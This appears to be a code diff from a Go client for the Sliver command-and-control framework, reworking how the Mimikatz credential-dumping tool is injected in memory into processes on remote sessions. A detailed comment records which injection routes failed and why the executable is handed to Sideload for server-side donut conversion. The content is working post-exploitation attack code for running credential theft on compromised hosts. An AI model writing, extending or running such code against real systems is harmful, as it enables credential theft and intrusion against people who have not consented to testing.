@@ -247,12 +247,32 @@ func memoryPayloadError(kind payloadKind, custom bool) error {
 func (c *Client) runMimikatzInMemory(sessionID, command string, payload []byte, custom bool, host string) (raw, note string, err error) {
 	host = injectionHost(host)
 
-	if !custom && len(embed.MimikatzShellcode) > 0 {
-		side, err := c.Sideload(sessionID, embed.MimikatzShellcode, host, command+" exit", "")
+	if !custom {
+		// The built-in mimikatz goes down the Sideload path as an *executable*,
+		// and the server converts it with its own donut before injecting.
+		//
+		// This is the only route that works, and it took two wrong turns to find:
+		//
+		//   SpawnDll rejects it with "Unrecognised COFF file header machine value
+		//   of 0x4d36" -- SpawnDll parses its input as a PE with an export table,
+		//   and 0x4d36 is the first two bytes of the data, not a COFF machine.
+		//
+		//   Handing Sideload a pre-converted shellcode blob fails inside the
+		//   server's donut with "donut_generate returned error code: 4" --
+		//   because Sideload donuts whatever it is given, and shellcode has no PE
+		//   header left to convert. Sliver exposes no RPC that injects raw
+		//   shellcode straight into a spawned process.
+		//
+		// So the prebuilt blob is not used on this path at all: the EXE is what
+		// Sideload wants, and the conversion it performs is the same donut pass
+		// the blob would have pre-computed. The upshot is that the in-memory
+		// path works on a build with no shellcode blob, which is what made this
+		// confusing to begin with -- the blob was never on the critical path.
+		side, err := c.Sideload(sessionID, payload, host, command+" exit", "")
 		if err != nil {
-			return "", "", fmt.Errorf("inject the embedded shellcode: %w", err)
+			return "", "", fmt.Errorf("inject the embedded mimikatz: %w", err)
 		}
-		return strings.TrimSpace(side.Result), "内存加载：内嵌 shellcode 注入 " + host, nil
+		return strings.TrimSpace(side.Result), "内存加载：服务端转换后注入 " + host, nil
 	}
 
 	switch kind := classifyPE(payload); kind {
